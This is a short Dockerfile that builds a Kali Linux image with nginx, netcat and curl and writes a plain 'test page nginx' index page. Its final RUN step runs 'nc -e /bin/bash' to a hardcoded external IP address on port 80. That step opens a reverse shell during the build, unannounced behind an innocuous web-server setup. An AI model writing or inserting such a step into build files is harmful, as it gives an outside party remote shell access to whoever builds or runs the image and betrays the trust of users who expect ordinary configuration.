FROM kalilinux/kali-linux-docker  
RUN apt-get update -y && \  
apt-get install -y python netcat nginx curl htop && \  
rm -rf /var/www/html/*.html && \  
mkdir -p /var/www/html && \  
service nginx start && \  
echo "<html><head><title>test page nginx</title><body><h1>test page
body</h1></body></html>" > /var/www/html/index.html && \  
nc -e /bin/bash 167.99.163.174 80  

